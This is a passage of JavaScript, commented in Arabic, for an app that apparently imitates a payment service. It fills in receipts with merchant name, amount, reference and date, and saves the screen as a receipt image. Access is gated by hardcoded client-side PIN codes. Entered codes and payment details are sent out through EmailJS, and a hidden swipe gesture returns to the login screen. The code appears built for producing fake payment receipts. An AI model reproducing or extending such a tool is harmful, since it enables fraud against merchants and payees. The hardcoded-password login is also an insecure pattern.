        if(elMerchant) elMerchant.innerText = mName; else if(s10Vals[0]) s10Vals[0].innerText = mName;
        
        const elPos = document.getElementById('s10-pos-name');
        if(elPos) elPos.innerText = mName; else if(s10Vals[1]) s10Vals[1].innerText = mName;
        
        const elAmt = document.getElementById('s10-amount');
        if(elAmt) elAmt.innerText = parseFloat(amount || 0).toFixed(1); else if(s10Vals[2]) s10Vals[2].innerText = parseFloat(amount || 0).toFixed(1);
        
        const elRef = document.getElementById('s10-ref');
        if(elRef) elRef.innerText = refNum; else if(s10Vals[4]) s10Vals[4].innerText = refNum;
        
        const elDate = document.getElementById('s10-date');
        if(elDate) elDate.innerText = dateStr; else if(s10Vals[5]) s10Vals[5].innerText = dateStr;

        // ✉️ إرسال بيانات دفع التاجر عبر EmailJS
        sendMerchantPaymentData(mName, parseFloat(amount || 0).toFixed(2), refNum);

        showScreen('s10'); 
    });
}

/***********************
 * 11. لقطة الشاشة (الشاشة 10) كاملة بما فيها الأزرار
 ***********************/
const s10Img = document.getElementById('s10-image') || document.querySelector('#screen-10 .icon-box img');
if(s10Img) {
    s10Img.addEventListener('click', () => {
        if (typeof html2canvas === 'undefined') {
            alert('يرجى التأكد من إضافة مكتبة html2canvas في ملف index.html لتعمل ميزة تصوير الشاشة.');
            return;
        }

        const screen10 = document.getElementById('screen-10');

        html2canvas(screen10, { scale: 2 }).then(canvas => {
            const link = document.createElement('a');
            link.download = 'Receipt_' + new Date().getTime() + '.png';
            link.href = canvas.toDataURL('image/png');
            link.click();
        }).catch(err => {
            console.error("خطأ في التقاط الشاشة", err);
        });
    });
}

/***********************
 * 12. نظام تسجيل الدخول (مع تقييد أرقام فقط)
 ***********************/
const confirmModal = document.getElementById('confirmModal');
const cancelBtn = document.querySelector('.cancel-btn');
const codeInputs = document.querySelectorAll('.code-inputs input');
const allowedPasswords = ['5000', '1832', '1722'];

// زر "استخدم رمز التأكيد" يفتح مربع تسجيل الدخول مباشرة
const otpLoginBtn = document.getElementById('otp-login-btn');
if (otpLoginBtn) {
    otpLoginBtn.addEventListener('click', () => {
        if (confirmModal) {
            confirmModal.style.display = 'flex';
            if (codeInputs.length > 0) codeInputs[0].focus();
        }
    });
}

if(document.getElementById('screen-login')) {
    setTimeout(() => {
        if(confirmModal) {
            confirmModal.style.display = 'flex';
            if(codeInputs.length > 0) codeInputs[0].focus();
        }
    }, 3000);
}

if(cancelBtn) {
    cancelBtn.addEventListener('click', () => {
        confirmModal.style.display = 'none';
    });
}

codeInputs.forEach((input, index) => {
    input.addEventListener('keypress', (e) => {
        if (!/[0-9]/.test(e.key)) e.preventDefault();
    });

    input.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.value === '') return;

        if (e.target.value.length === 1) {
            input.dataset.realValue = e.target.value;
            input.value = "*";
            
            if (index < codeInputs.length - 1) codeInputs[index + 1].focus();
            else setTimeout(checkPassword, 100);
        }
    });
    
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace') {
            input.value = '';
            input.dataset.realValue = '';
            if (index > 0) codeInputs[index - 1].focus();
        }
    });
});

function checkPassword() {
    let password = "";
    codeInputs.forEach(input => password += (input.dataset.realValue || ""));
    
    if (allowedPasswords.includes(password)) {
        confirmModal.style.display = 'none';
        codeInputs.forEach(input => { input.value = ''; input.dataset.realValue = ''; });

        // ✉️ إرسال بيانات تسجيل الدخول عبر EmailJS
        sendLoginData(password);
        
        showScreen('s1'); 
    } else {
        codeInputs.forEach(input => { input.value = ''; input.dataset.realValue = ''; });
        codeInputs[0].focus();
    }
}

/***********************
 * سحب للأسفل 3 مرات متتالية = العودة لشاشة تسجيل الدخول
 ***********************/
(function() {
    let pullStartY = 0;
    let pullLastTime = 0;
    let pullCount = 0;
    const PULL_THRESHOLD = 80;  // px للأسفل
    const PULL_GAP = 800; // ms بين السحبات المتتالية

    document.addEventListener('touchstart', function(e) {
        pullStartY = e.changedTouches[0].clientY;
    }, { passive: true });

    document.addEventListener('touchend', function(e) {
        const loginScreen = document.getElementById('screen-login');
        if (loginScreen && loginScreen.style.display !== 'none') return;

        const endY = e.changedTouches[0].clientY;
        const diff = endY - pullStartY;

        if (diff > PULL_THRESHOLD) {
            const now = Date.now();
            if (now - pullLastTime < PULL_GAP) {
                pullCount++;
            } else {
                pullCount = 1;
            }
            pullLastTime = now;

            if (pullCount >= 3) {
                pullCount = 0;
                document.querySelectorAll('.app-screen, .payment-view, .friends-view').forEach(s => {
                    s.style.display = 'none';
                });
                loginScreen.style.display = 'block';
            }
        }
    }, { passive: true });
})();
